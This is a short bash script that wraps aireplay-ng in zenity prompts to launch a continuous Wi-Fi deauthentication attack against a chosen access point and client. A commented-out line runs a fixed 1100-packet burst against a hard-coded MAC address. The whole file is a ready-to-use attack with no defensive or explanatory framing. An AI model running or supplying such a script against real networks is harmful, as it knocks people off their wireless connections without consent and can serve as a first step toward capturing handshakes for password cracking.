#!/bin/bash
ap=$(zenity --entry --text="ap mac-address")
st=$(zenity --entry --text="client mac-address")
xterm -hold -e "aireplay-ng -0 0 -a $ap -c $st wlan0mon"
#aireplay-ng -0 1100 -a FA:8F:CA:88:53:D9 --ignore-negative wlan0mon
